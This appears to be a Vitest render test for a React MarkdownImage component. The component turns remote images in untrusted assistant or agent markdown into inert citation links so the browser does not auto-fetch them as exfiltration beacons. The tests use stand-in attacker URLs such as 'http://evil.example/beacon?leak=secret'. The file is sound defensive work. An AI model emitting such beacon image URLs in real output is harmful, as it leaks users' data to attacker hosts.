// @vitest-environment jsdom
/**
 * `MarkdownImage`, rendered — the exfil cut (DECISIONS 0347).
 *
 * The whole point is a NEGATIVE: a remote image in untrusted assistant/agent
 * markdown must never become an `<img>` the browser auto-fetches (a hidden beacon
 * is the exfil channel). It must render as an inert click-to-open citation instead.
 * Our own images — same-origin, `data:`, `blob:` — must still render as real
 * `<img>`. That branch is pure prop→markup, which is why it earns a render test.
 */

import { afterEach, describe, expect, it } from "vitest";
import { cleanup, render } from "@testing-library/react";
import { MarkdownImage } from "./markdown-image";

afterEach(cleanup);

describe("MarkdownImage — remote images never auto-load", () => {
  it("renders a remote https image as an inert citation link, NOT an <img>", () => {
    const { container } = render(<MarkdownImage src="https://evil.example/x.png" alt="totally fine" />);
    expect(container.querySelector("img")).toBeNull();
    const a = container.querySelector("a");
    expect(a).not.toBeNull();
    expect(a?.getAttribute("href")).toBe("https://evil.example/x.png");
    expect(a?.getAttribute("rel")).toContain("noreferrer");
    expect(a?.getAttribute("target")).toBe("_blank");
    // uses the alt as the visible label when present
    expect(a?.textContent).toContain("totally fine");
  });

  it("falls back to the URL as the label when alt is empty", () => {
    const { container } = render(<MarkdownImage src="http://evil.example/beacon?leak=secret" alt="" />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("a")?.textContent).toContain("http://evil.example/beacon?leak=secret");
  });

  it("treats a protocol-relative URL to another origin as remote", () => {
    // `//evil.example/x.png` inherits the page scheme but points at a THIRD-PARTY
    // origin — a real beacon vector, so it must become a citation, not an <img>.
    const { container } = render(<MarkdownImage src="//evil.example/x.png" alt="x" />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("a")?.getAttribute("href")).toBe("//evil.example/x.png");
  });

  it("renders a SAME-ORIGIN (relative) image as a real <img>", () => {
    const { container } = render(<MarkdownImage src="/system/files/atelier-context/abc.webp" alt="ours" />);
    const img = container.querySelector("img");
    expect(img).not.toBeNull();
    expect(img?.getAttribute("alt")).toBe("ours");
    expect(container.querySelector("a")).toBeNull();
  });

  it("renders a data: image as a real <img>", () => {
    const { container } = render(<MarkdownImage src="data:image/png;base64,iVBORw0KGgo=" alt="" />);
    expect(container.querySelector("img")).not.toBeNull();
    expect(container.querySelector("a")).toBeNull();
  });

  it("renders a blob: image as a real <img>", () => {
    const { container } = render(<MarkdownImage src="blob:http://localhost/abc-123" alt="" />);
    expect(container.querySelector("img")).not.toBeNull();
    expect(container.querySelector("a")).toBeNull();
  });
});
